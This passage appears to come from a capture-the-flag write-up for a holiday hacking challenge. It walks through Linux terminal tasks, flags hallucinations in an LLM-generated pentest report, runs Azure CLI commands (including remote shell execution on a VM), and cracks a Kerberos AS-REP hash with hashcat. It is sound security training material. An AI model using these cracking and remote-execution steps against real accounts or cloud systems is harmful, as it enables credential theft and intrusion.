35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:\nHHCUSERNAME=Toolip\nAREA=cisantassurfshack\nBPUSERHOME=/home/elf\nLESSCLOSE=/usr/bin/lesspipe %s %s\nTERM=screen\nLESSOPEN=| /usr/bin/lesspipe %s\nUSER=elf\nTOKENS=linux101\nTMUX_PANE=%2\nBPUSER=elf\nSHLVL=3\nLC_ALL=C.UTF-8\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\nMAIL=/var/mail/elf\nLOCATION=7,8\n_=/usr/bin/printenv\nelf@1f330ef9890f:~$\n</code></pre> <p>Task 8</p> <p>Next, head into the workshop.</p> <pre><code>elf@1f330ef9890f:~$ cd workshop\nelf@1f330ef9890f:~/workshop$ \n</code></pre> <p>Task 9</p> <p>A troll is hiding in one of the workshop toolboxes. Use \"grep\" while ignoring case to find which toolbox the troll is in.</p> <pre><code>elf@087bb4eaad8f:~/workshop$ cat toolbox_* | grep -i \"troll\"\ntRoLl.4056180441832623\nelf@087bb4eaad8f:~/workshop$ \n</code></pre> <p>Task 10</p> <p>A troll is blocking the present_engine from starting. Run the present_engine binary to retrieve this troll.</p> <pre><code>elf@86347d5cfa0e:~/workshop$ ./present_engine\nbash: ./present_engine: Permission denied\nelf@86347d5cfa0e:~/workshop$ ls -l | head\ntotal 6888\ndrwxr-xr-x 1 elf elf    4096 Dec  2 22:19 electrical\n-r--r--r-- 1 elf elf 4990336 Dec  2 22:19 present_engine\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_0.txt\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_1.txt\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_10.txt\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_100.txt\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_101.txt\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_102.txt\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_103.txt\nelf@86347d5cfa0e:~/workshop$ chmod 777 present_engine \nelf@86347d5cfa0e:~/workshop$ ls -l | head\ntotal 6888\ndrwxr-xr-x 1 elf elf    4096 Dec  2 22:19 electrical\n-rwxrwxrwx 1 elf elf 4990336 Dec  2 22:19 present_engine\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_0.txt\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_1.txt\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_10.txt\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_100.txt\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_101.txt\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_102.txt\n-rw-r--r-- 1 elf elf      42 Dec  2 22:19 toolbox_103.txt\nelf@86347d5cfa0e:~/workshop$ ./present_engine \ntroll.898906189498077\nelf@86347d5cfa0e:~/workshop$\n</code></pre> <p>Task 11</p> <p>Trolls have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0.</p> <pre><code>elf@86347d5cfa0e:~/workshop$ cd /home/elf/workshop/electrical/\nelf@86347d5cfa0e:~/workshop/electrical$ ls\nblown_fuse0\nelf@86347d5cfa0e:~/workshop/electrical$ mv blown_fuse0 fuse0\n</code></pre> <p>Task 12</p> <p>Now, make a symbolic link (symlink) named fuse1 that points to fuse0</p> <pre><code>elf@86347d5cfa0e:~/workshop/electrical$ ln -s fuse0 fuse1\n</code></pre> <p>Task 13</p> <p>Make a copy of fuse1 named fuse2.</p> <pre><code>elf@86347d5cfa0e:~/workshop/electrical$ cp fuse1 fuse2\n</code></pre> <p>Task 14</p> <p>We need to make sure trolls don't come back. Add the characters \"TROLL_REPELLENT\" into the file fuse2.</p> <pre><code>elf@86347d5cfa0e:~/workshop/electrical$ echo \"TROLL_REPELLENT\" &gt;&gt; fuse2\n</code></pre> <p>Task 15</p> <p>Find the troll somewhere in /opt/troll_den.</p> hintme <p>\"find /some/directory -iname 'example'\" would find any file with \"example\" in the name while ignoring case.</p> <pre><code>elf@86347d5cfa0e:~/workshop/electrical$ find /opt/troll_den -iname '*troll*'\n/opt/troll_den\n/opt/troll_den/plugins/embeddedjsp/src/main/java/org/apache/struts2/jasper/compiler/ParserController.java\n/opt/troll_den/apps/showcase/src/main/resources/tRoLl.6253159819943018\n/opt/troll_den/apps/rest-showcase/src/main/java/org/demo/rest/example/IndexController.java\n/opt/troll_den/apps/rest-showcase/src/main/java/org/demo/rest/example/OrdersController.java\nelf@86347d5cfa0e:~/workshop/electrical$\n</code></pre> <p>Task 16</p> <p>Find the file somewhere in /opt/troll_den that is owned by the user troll.</p> <pre><code>elf@86347d5cfa0e:~/workshop/electrical$ find /opt/troll_den -user troll\n/opt/troll_den/apps/showcase/src/main/resources/template/ajaxErrorContainers/tr0LL_9528909612014411\n</code></pre> <p>Task 17</p> <p>Find the file created by trolls that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/troll_den.</p> See AI Assistance <p>My Prompt: What is the linux bash shell command to find a file greater than 108kb and smaller than 110kb created by a particular user ChatGPT Response: You can use the find command in the Linux bash shell to search for files based on criteria such as size, creation time, and owner. Here's an example command that finds files greater than 108KB and smaller than 110KB, created by a specific user: <pre><code>find /path/to/search -type f -size +108k -size -110k -user username\n</code></pre> Replace /path/to/search with the directory where you want to start the search, username with the actual username you're interested in, and adjust the size values as needed. The + and - signs before the size values indicate greater than and smaller than, respectively. Here's a breakdown of the command:</p> <p>find: The command to search for files. /path/to/search: The directory where the search begins. -type f: Specifies that only regular files should be considered (not directories or other types of files). -size +108k -size -110k: Specifies the size range, greater than 108KB and smaller than 110KB. -user username: Specifies the username of the file's owner.</p> <p>Remember to replace /path/to/search and username with your actual values.</p> <pre><code>elf@86347d5cfa0e:~/workshop/electrical$ find /opt/troll_den -type f -size +108k -size -110k\n/opt/troll_den/plugins/portlet-mocks/src/test/java/org/apache/t_r_o_l_l_2579728047101724\n</code></pre> <p>Task 18</p> <p>List running processes to find another troll.</p> <pre><code>elf@86347d5cfa0e:~/workshop/electrical$ ps -aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\ninit           1  0.0  0.0  20112 16504 pts/0    Ss+  01:30   0:00 /usr/bin/python3 /usr/local/bin/tmuxp load ./mysession.yaml\nelf        11506  0.3  0.0  31520 26688 pts/2    S+   01:48   0:00 /usr/bin/python3 /14516_troll\nelf        11906  0.0  0.0   7672  3204 pts/3    R+   01:49   0:00 ps -aux\n</code></pre> <p>Task 19</p> <p>The 14516_troll process is listening on a TCP port. Use a command to have the only listening port display to the screen.</p> See AI Assistance <p>My Prompt: what is the linux command to display the listening port of a process?  ChatGPT Response: To display the listening ports of a process in Linux, you can use the lsof command along with grep to filter the results. Here's an example: <pre><code>lsof -i -P -n | grep LISTEN\n</code></pre> This command uses lsof to list all open files (including network connections) with the -i option, and -P -n options are used to prevent the conversion of port numbers to service names and host names for faster execution. The grep LISTEN part filters the output to show only the processes that are listening on ports. You can also use netstat to achieve similar results: <pre><code>netstat -tulpn | grep LISTEN\n</code></pre> This command shows the listening ports along with the associated processes. The -tulpn options display TCP ports (-t), UDP ports (-u), the program name/ID (-p), and numeric addresses (-n). Choose the command that suits your preference or availability on your system.</p> <pre><code>elf@86347d5cfa0e:~/workshop/electrical$ netstat -tulpn | grep LISTEN\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\ntcp        0      0 0.0.0.0:54321           0.0.0.0:*               LISTEN      11506/python3 \n</code></pre> <p>Task 20</p> <p>The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last troll.</p> <pre><code>elf@86347d5cfa0e:~/workshop/electrical$ curl 0.0.0.0:54321\ntroll.73180338045875\n</code></pre> <p>Task 21</p> <p>Your final task is to stop the 14516_troll process to collect the remaining presents.</p> <pre><code>elf@86347d5cfa0e:~/workshop/electrical$ kill 11506\n</code></pre> <p></p> <p>Answer</p> <p>Congratulations, you caught all the trolls and retrieved all the presents! Type \"exit\" to close...</p>"},{"location":"objectives/o3/#response","title":"Response","text":"<p>Ginger Breddie</p> <p>Wow, if your surfing skills are as good as your Linux skills, you could be winning competitions!</p>"},{"location":"objectives/o4/","title":"Reportinator","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o4/#objective","title":"Objective","text":"<p>Request</p> <p>Noel Boetie used ChatNPT to write a pentest report. Go to Christmas Island and help him clean it up.</p> Noel Boetie <p>Hey there, Noel Boetie speaking! I recently tried using ChatNPT to generate my penetration testing report. It's a pretty nifty tool, but there are a few issues in the output that I've noticed.I need some guidance in finding any errors in the way it generated the content, especially those odd hallucinations in the LLM output.I know it's not perfect, but I'd really appreciate the extra eyes on this one.Some of the issues might be subtle, so don't be afraid to dig deep and ask for further clarification if you're unsure.I've heard that you folks are experts about LLM outputs and their common issues, so I trust you can help me with this.Your input will be invaluable to me, so please feel free to share any insights or findings you  may have.I'm looking forward to working with you all and improving the quality of the ChatNPT-generated penetration testing  report.Thanks in advance for your help! I truly appreciate it! Let's make this report the best it can be!</p>"},{"location":"objectives/o4/#hints","title":"Hints","text":"Reportinator <p>From: Noel Boetie Terminal: Reportinator I know AI sometimes can get specifics wrong unless the prompts are well written. Maybe chatNPT made some mistakes here.</p>"},{"location":"objectives/o4/#solution","title":"Solution","text":"<p>This challenge requires reviewing a ChatNPT generated penetration test report and identifying which findings are legitimate and which findings are hallucinations created by ChatNPT. We are reminded that \"All IP addresses have been sanitized to protect our client. Do NOT mark IP address ranges as a hallucination.\" </p> <p>At the end of each finding click on the icon to swap between a green check (legitimate) or a red X (hallucination).</p> <p>Finding 1</p> This information is useful for another challenge <p>Active Directory</p> <p></p> <p>Finding 2</p> <p> </p> <p>Finding 3</p> <p>The specified port 88555/TCP is not a valid port number. </p> <p></p> <p>Finding 4</p> <p> </p> <p>Finding 5</p> <p> </p> <p>Finding 6</p> <p>HTTP SEND is not a valid HTTP request method.</p> <p></p> <p>Finding 7</p> <p> </p> <p>Finding 8</p> <p> </p> <p>Finding 9</p> <p>The IP address in the Location Header field is not a valid IPv4 address format.</p> <p> </p> <p>Answer</p> <p>Finding 1: True Finding 2: True Finding 3: False Finding 4: True Finding 5: True Finding 6: False Finding 7: True Finding 8: True Finding 9: False</p>"},{"location":"objectives/o4/#response","title":"Response","text":"<p>Noel Boetie</p> <p>Great job on completing that challenge! Ever thought about how your newfound skills might come into play later on? Keep that mind sharp, and remember, today's victories are tomorrow's strategies!</p>"},{"location":"objectives/o5/","title":"Azure 101","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o5/#objective","title":"Objective","text":"<p>Request</p> <p>Help Sparkle Redberry with some Azure command line skills. Find the elf and the terminal on Christmas Island.</p> Sparkle Redberry <p>Hey, Sparkle Redberry here! So, I've been trying to learn about Azure and the Azure CLI and it's driving me nuts. Alabaster Snowball decided to use Azure to host some of his fancy new IT stuff on Geese Islands, and now us elves have to learn it too. Anyway, I know it's important and everyone says it's not as difficult as it seems, but honestly it still feels like quite a challenge for me. Alabaster sent us this Azure CLI reference as well. It's super handy, he said. Honestly, it just confuses me even more. If you can spare a moment, would you mind giving me a hand with this terminal? I'd be really grateful! Pretty please, with holly leaves on top!</p>"},{"location":"objectives/o5/#hints","title":"Hints","text":"Azure CLI Reference <p>From: Sparkle Redberry Terminal: Azure 101 The Azure CLI tools come with a builtin help system, but Microsoft also provides this handy cheatsheet.</p>"},{"location":"objectives/o5/#solution","title":"Solution","text":"<p>This challenge steps us through the basics of using Azure CLI. </p> <p>Task 1</p> <p>You may not know this but the Azure cli help messages are very easy to access. First, try typing: $ az help | less</p> <p><pre><code>elf@471577fbf558:~$ az help | less\n</code></pre> We can scroll or use the Down key to reach the END of the help menu. To exit out of the Azure CLI help menu or any output that returns using | less, press the Q key.</p> <p></p> <p>Task</p> <p>Next, you've already been configured with credentials. Use 'az' and your 'account' to 'show' your current details and make sure to pipe to less ( | less )</p> <pre><code>elf@471577fbf558:~$ az account show | less\n</code></pre> <p>Task 3</p> <p>Excellent! Now get a list of resource groups in Azure. For more information: https://learn.microsoft.com/en-us/cli/azure/group?view=azure-cli-latest</p> <pre><code>elf@471577fbf558:~$ az group list\n[\n  {\n    \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1\",\n    \"location\": \"eastus\",\n    \"managedBy\": null,\n    \"name\": \"northpole-rg1\",\n    \"properties\": {\n      \"provisioningState\": \"Succeeded\"\n    },\n    \"tags\": {}\n  },\n  {\n    \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2\",\n    \"location\": \"westus\",\n    \"managedBy\": null,\n    \"name\": \"northpole-rg2\",\n    \"properties\": {\n      \"provisioningState\": \"Succeeded\"\n    },\n    \"tags\": {}\n  }\n]\nelf@471577fbf558:~$ \n</code></pre> <p>Task 4</p> <p>Ok, now use one of the resource groups to get a list of function apps. For more information: https://learn.microsoft.com/en-us/cli/azure/functionapp?view=azure-cli-latest Note: Some of the information returned from this command relates to other cloud assets used by Santa and his elves.</p> This information is used in another challenge <p>Certificate SSHenanigans</p> <pre><code>elf@471577fbf558:~$ az functionapp list --resource-group northpole-rg1\n[\n  {\n    \"appServicePlanId\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/serverfarms/EastUSLinuxDynamicPlan\",\n    \"availabilityState\": \"Normal\",\n    \"clientAffinityEnabled\": false,\n    \"clientCertEnabled\": false,\n    \"clientCertExclusionPaths\": null,\n    \"clientCertMode\": \"Required\",\n    \"cloningInfo\": null,\n    \"containerSize\": 0,\n    \"customDomainVerificationId\": \"201F74B099FA881DB9368A26C8E8B8BB8B9AF75BF450AF717502AC151F59DBEA\",\n    \"dailyMemoryTimeQuota\": 0,\n    \"defaultHostName\": \"northpole-ssh-certs-fa.azurewebsites.net\",\n    \"enabled\": true,\n    \"enabledHostNames\": [\n      \"northpole-ssh-certs-fa.azurewebsites.net\"\n    ],\n    \"extendedLocation\": null,\n    \"hostNameSslStates\": [\n      {\n        \"certificateResourceId\": null,\n        \"hostType\": \"Standard\",\n        \"ipBasedSslResult\": null,\n        \"ipBasedSslState\": \"NotConfigured\",\n        \"name\": \"northpole-ssh-certs-fa.azurewebsites.net\",\n        \"sslState\": \"Disabled\",\n        \"thumbprint\": null,\n        \"toUpdate\": null,\n        \"toUpdateIpBasedSsl\": null,\n        \"virtualIPv6\": null,\n        \"virtualIp\": null\n      },\n      {\n        \"certificateResourceId\": null,\n        \"hostType\": \"Repository\",\n        \"ipBasedSslResult\": null,\n        \"ipBasedSslState\": \"NotConfigured\",\n        \"name\": \"northpole-ssh-certs-fa.scm.azurewebsites.net\",\n        \"sslState\": \"Disabled\",\n        \"thumbprint\": null,\n        \"toUpdate\": null,\n        \"toUpdateIpBasedSsl\": null,\n        \"virtualIPv6\": null,\n        \"virtualIp\": null\n      }\n    ],\n    \"hostNames\": [\n      \"northpole-ssh-certs-fa.azurewebsites.net\"\n    ],\n    \"hostNamesDisabled\": false,\n    \"hostingEnvironmentProfile\": null,\n    \"httpsOnly\": false,\n    \"hyperV\": false,\n    \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/pro\nviders/Microsoft.Web/sites/northpole-ssh-certs-fa\",\n    \"identity\": {\n      \"principalId\": \"d3be48a8-0702-407c-89af-0319780a2aea\",\n      \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n      \"type\": \"SystemAssigned\",\n      \"userAssignedIdentities\": null\n    },\n    \"inProgressOperationId\": null,\n    \"isDefaultContainer\": null,\n    \"isXenon\": false,\n    \"keyVaultReferenceIdentity\": \"SystemAssigned\",\n    \"kind\": \"functionapp,linux\",\n    \"lastModifiedTimeUtc\": \"2023-11-09T14:43:01.183333\",\n    \"location\": \"East US\",\n    \"maxNumberOfWorkers\": null,\n    \"name\": \"northpole-ssh-certs-fa\",\n    \"outboundIpAddresses\": \"\",\n    \"possibleOutboundIpAddresses\": \"\",\n    \"publicNetworkAccess\": null,\n    \"redundancyMode\": \"None\",\n    \"repositorySiteName\": \"northpole-ssh-certs-fa\",\n    \"reserved\": true,\n    \"resourceGroup\": \"northpole-rg1\",\n    \"scmSiteAlsoStopped\": false,\n    \"siteConfig\": {\n      \"acrUseManagedIdentityCreds\": false,\n      \"acrUserManagedIdentityId\": null,\n      \"alwaysOn\": false,\n      \"antivirusScanEnabled\": null,\n      \"apiDefinition\": null,\n      \"apiManagementConfig\": null,\n      \"appCommandLine\": null,\n      \"appSettings\": null,\n      \"autoHealEnabled\": null,\n      \"autoHealRules\": null,\n      \"autoSwapSlotName\": null,\n      \"azureMonitorLogCategories\": null,\n      \"azureStorageAccounts\": null,\n      \"connectionStrings\": null,\n      \"cors\": null,\n      \"customAppPoolIdentityAdminState\": null,\n      \"customAppPoolIdentityTenantState\": null,\n      \"defaultDocuments\": null,\n      \"detailedErrorLoggingEnabled\": null,\n      \"documentRoot\": null,\n      \"elasticWebAppScaleLimit\": null,\n      \"experiments\": null,\n      \"fileChangeAuditEnabled\": null,\n      \"ftpsState\": null,\n      \"functionAppScaleLimit\": 200,\n      \"functionsRuntimeScaleMonitoringEnabled\": null,\n      \"handlerMappings\": null,\n      \"healthCheckPath\": null,\n      \"http20Enabled\": true,\n      \"http20ProxyFlag\": null,\n      \"httpLoggingEnabled\": null,\n      \"ipSecurityRestrictions\": null,\n      \"ipSecurityRestrictionsDefaultAction\": null,\n      \"javaContainer\": null,\n      \"javaContainerVersion\": null,\n      \"javaVersion\": null,\n      \"keyVaultReferenceIdentity\": null,\n      \"limits\": null,\n      \"linuxFxVersion\": \"Python|3.11\",\n      \"loadBalancing\": null,\n      \"localMySqlEnabled\": null,\n      \"logsDirectorySizeLimit\": null,\n      \"machineKey\": null,\n      \"managedPipelineMode\": null,\n      \"managedServiceIdentityId\": null,\n      \"metadata\": null,\n      \"minTlsCipherSuite\": null,\n      \"minTlsVersion\": null,\n      \"minimumElasticInstanceCount\": 0,\n      \"netFrameworkVersion\": null,\n      \"nodeVersion\": null,\n      \"numberOfWorkers\": 1,\n      \"phpVersion\": null,\n      \"powerShellVersion\": null,\n      \"preWarmedInstanceCount\": null,\n      \"publicNetworkAccess\": null,\n      \"publishingPassword\": null,\n      \"publishingUsername\": null,\n      \"push\": null,\n      \"pythonVersion\": null,\n      \"remoteDebuggingEnabled\": null,\n      \"remoteDebuggingVersion\": null,\n      \"requestTracingEnabled\": null,\n      \"requestTracingExpirationTime\": null,\n      \"routingRules\": null,\n      \"runtimeADUser\": null,\n      \"runtimeADUserPassword\": null,\n      \"scmIpSecurityRestrictions\": null,\n      \"scmIpSecurityRestrictionsDefaultAction\": null,\n      \"scmIpSecurityRestrictionsUseMain\": null,\n      \"scmMinTlsVersion\": null,\n      \"scmType\": null,\n      \"sitePort\": null,\n      \"sitePrivateLinkHostEnabled\": null,\n      \"storageType\": null,\n      \"supportedTlsCipherSuites\": null,\n      \"tracingOptions\": null,\n      \"use32BitWorkerProcess\": null,\n      \"virtualApplications\": null,\n      \"vnetName\": null,\n      \"vnetPrivatePortsCount\": null,\n      \"vnetRouteAllEnabled\": null,\n      \"webSocketsEnabled\": null,\n      \"websiteTimeZone\": null,\n      \"winAuthAdminState\": null,\n      \"winAuthTenantState\": null,\n      \"windowsConfiguredStacks\": null,\n      \"windowsFxVersion\": null,\n      \"xManagedServiceIdentityId\": null\n    },\n    \"slotSwapStatus\": null,\n    \"state\": \"Running\",\n    \"storageAccountRequired\": false,\n    \"suspendedTill\": null,\n    \"tags\": {\n      \"create-cert-func-url-path\": \"/api/create-cert?code=candy-cane-twirl\",\n      \"project\": \"northpole-ssh-certs\"\n    },\n    \"targetSwapSlot\": null,\n    \"trafficManagerHostNames\": null,\n    \"type\": \"Microsoft.Web/sites\",\n    \"usageState\": \"Normal\",\n    \"virtualNetworkSubnetId\": null,\n    \"vnetContentShareEnabled\": false,\n    \"vnetImagePullEnabled\": false,\n    \"vnetRouteAllEnabled\": false\n  }\n]\n(END)\n</code></pre> <p>Task 5</p> <p>Find a way to list the only VM in one of the resource groups you have access to. For more information: https://learn.microsoft.com/en-us/cli/azure/vm?view=azure-cli-latest</p> <pre><code>elf@471577fbf558:~$ az vm list -g northpole-rg1\nThe client 'f17559a4-d8a2-4661-ba0f-c04f8cf2926d' with object id '8deacb33-214d-4d94-9ab4-d27768410f17' does not have authorization to perform action 'Microsoft.Compute/virtualMachines/read' over scope '/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/virtualMachines' or the scope is invalid. If access was recently granted, please refresh your credentials.\nelf@471577fbf558:~$ az vm list -g northpole-rg2 | less\n[\n  {\n    \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2/providers/Microsoft.Compute/virtualMachines/NP-VM1\",\n    \"location\": \"eastus\",\n    \"name\": \"NP-VM1\",\n    \"properties\": {\n      \"hardwareProfile\": {\n        \"vmSize\": \"Standard_D2s_v3\"\n      },\n      \"provisioningState\": \"Succeeded\",\n      \"storageProfile\": {\n        \"imageReference\": {\n          \"offer\": \"UbuntuServer\",\n          \"publisher\": \"Canonical\",\n          \"sku\": \"16.04-LTS\",\n          \"version\": \"latest\"\n        },\n        \"osDisk\": {\n          \"caching\": \"ReadWrite\",\n          \"createOption\": \"FromImage\",\n          \"managedDisk\": {\n            \"storageAccountType\": \"Standard_LRS\"\n          },\n          \"name\": \"VM1_OsDisk_1\"\n        }\n      },\n      \"vmId\": \"e5f16214-18be-4a31-9ebb-2be3a55cfcf7\"\n    },\n    \"resourceGroup\": \"northpole-rg2\",\n    \"tags\": {}\n  }\n]\n(END)\n</code></pre> <p>Task 6</p> <p>Find a way to invoke a run-command against the only Virtual Machine (VM) so you can RunShellScript and get a directory listing to reveal a file on the Azure VM. For more information: https://learn.microsoft.com/en-us/cli/azure/vm/run-command?view=azure-cli-latest#az-vm-run-command-invoke</p> <p>We already know the resource group (northpole-rg2), the VM (NP-VM1), and the command to get a directory listing (ls)</p> <pre><code>elf@471577fbf558:~$ az vm run-command invoke -g northpole-rg2 -n NP-VM1 --command-id RunShellScript --scripts \"ls -la\"\n{\n  \"value\": [\n    {\n      \"code\": \"ComponentStatus/StdOut/succeeded\",\n      \"displayStatus\": \"Provisioning succeeded\",\n      \"level\": \"Info\",\n      \"message\": \"total 52\\ndrwxr-x--- 1 0 0 4096 Dec  4 20:38 .\\ndrwxr-x--- 1 0 0 4096 Dec  4 20:38 ..\\ndrwxr-x--- 1 0 0 4096 Dec  4 20:37 bin\\ndrwxr-xr-x 1 0 0 4096 Dec  4 20:38 etc\\ndrwxr-x--- 1 0 0 4096 Dec  2 22:16 home\\n-rwxr-x--- 1 0 0    0 Dec  4 20:37 jinglebells\\ndrwxr-xr-x 1 0 0 4096 Dec  4 20:37 lib\\ndrwxr-xr-x 1 0 0 4096 Dec  4 20:37 lib64\\ndrwxr-xr-x 1 0 0 4096 Dec  4 20:37 usr\\n\",\n      \"time\": 1704303815\n    },\n    {\n      \"code\": \"ComponentStatus/StdErr/succeeded\",\n      \"displayStatus\": \"Provisioning succeeded\",\n      \"level\": \"Info\",\n      \"message\": \"\",\n      \"time\": 1704303815\n    }\n  ]\n}\n</code></pre> <p>Answer</p> <p>Great, you did it all!</p>"},{"location":"objectives/o5/#response","title":"Response","text":"<p>Sparkle Redberry</p> <p>Wow, you did it! It makes quite a bit more sense to me now. Thank you so much! That Azure Function App URL you came across in the terminal looked interesting. It might be part of that new project Alabaster has been working on with the help of ChatNPT. Let me tell you, since he started using ChatNPT he's been introducing a lot of amazing innovation across the islands. Knowing Alabaster, he'll be delighted to tell you all about it! I think I last saw him on Pixel island. By the way, as part of the Azure documentation he sent the elves, Alabaster also noted that if Azure CLI tools aren't available in an Azure VM we should use the Azure REST API instead. I'm not really sure what that means, but I guess I know what I'll be studying up on next.</p>"},{"location":"objectives/o7/","title":"Hashcat","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o7/#objective","title":"Objective","text":"<p>Request</p> <p>Eve Snowshoes is trying to recover a password. Head to the Island of Misfit Toys and take a crack at it!</p> Eve Snowshoes <p>Greetings, fellow adventurer!Welcome to Scaredy-Kite Heights, the trailhead of the trek through the mountains on the way to the wonderful Squarewheel Yard! I'm Eve Snowshoes, resident tech hobbyist, and I hear Alabaster is in quite the predicament.Our dear Alabaster forgot his password. He's been racking his jingle bells of memory with no luck.I've been trying to handle this password recovery thing parallel to this hashcat business myself but it seems like I am missing some tricks.So, what do you say, chief, ready to get your hands on some hashcat action and help a distraught elf out?</p>"},{"location":"objectives/o7/#solution","title":"Solution","text":"<p>Clicking on the Cranberry Pi terminal icon presents us with a poem that contains clues to solving this challenge.</p> Clicking on the Cranberry Pi terminal icon presents us with a poem that contains clues to solving this challenge. <p>In a realm of bytes and digital cheer, The festive season brings a challenge near. Santa's code has twists that may enthrall, It's up to you to decode them all.</p> <p>Hidden deep in the snow is a kerberos token, Its type and form, in whispers, spoken. From reindeers' leaps to the elfish toast, Might the secret be in an ASREP roast?</p> <p><code>hashcat</code>, your reindeer, so spry and true, Will leap through hashes, bringing answers to you. But heed this advice to temper your pace, <code>-w 1 -u 1 --kernel-accel 1 --kernel-loops 1</code>, just in case.</p> <p>For within this quest, speed isn't the key, Patience and thought will set the answers free. So include these flags, let your command be slow, And watch as the right solutions begin to show.</p> <p>For hints on the hash, when you feel quite adrift, This festive link, your spirits, will lift: https://hashcat.net/wiki/doku.php?id=example_hashes</p> <p>And when in doubt of <code>hashcat</code>'s might, The CLI docs will guide you right: https://hashcat.net/wiki/doku.php?id=hashcat</p> <p>Once you've cracked it, with joy and glee so raw, Run /bin/runtoanswer, without a flaw. Submit the password for Alabaster Snowball, Only then can you claim the prize, the best of all.</p> <p>So light up your terminal, with commands so grand, Crack the code, with <code>hashcat</code> in hand! Merry Cracking to each, by the pixelated moon's light, May your hashes be merry, and your codes so right!</p> <ul> <li>Determine the hash type in hash.txt and perform a wordlist cracking attempt to find which password is correct and submit it to    /bin/runtoanswer .*</li> </ul> <p>Listing our directory contents we see that we have access to the HELP (which contains the poem), hash.txt, and password_list.txt files.</p> <pre><code>elf@f9961835c47e:~$ ls\nHELP  hash.txt  password_list.txt\nelf@f9961835c47e:~$ cat hash.txt \n$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966elf@f9961835c47e:~$ \n</code></pre> <p>In order to run hashcat successfully, we want to know what hash type we are dealing with. The HELP poem included some hints:</p> <p></p> <p>Looking at the example hashes, we find hash 18200 'Kerberos 5, etype 23, AS-REP'. Examining the hash file we can also see the beginning of the hash <code>$krb5asrep</code> and the format look to match the example of hash 18200.</p> <p>Next, let's run hashcat using this information within the provided password list file. </p> Performance Options <p>Remember to use the recommended flags for performance that were mentioned in the poem <code>-w 1 -u 1 --kernel-accel 1 --kernel-loops 1</code>.</p> <p><pre><code>elf@f9961835c47e:~$ hashcat -m 18200 -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 --force hash.txt password_list.txt\nhashcat (v5.1.0) starting...\n\nOpenCL Platform #1: The pocl project\n====================================\n* Device #1: pthread-Intel(R) Xeon(R) CPU @ 2.80GHz, 8192/30063 MB allocatable, 8MCU\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers:\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nATTENTION! Pure (unoptimized) OpenCL kernels selected.\nThis enables cracking passwords and salts &gt; length 32 but for the price of drastically reduced performance.\nIf you want to switch to optimized OpenCL kernels, append -O to your commandline.\n\nWatchdog: Hardware monitoring interface not found on your system.\nWatchdog: Temperature abort trigger disabled.\n\n* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=16 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=18200 -D 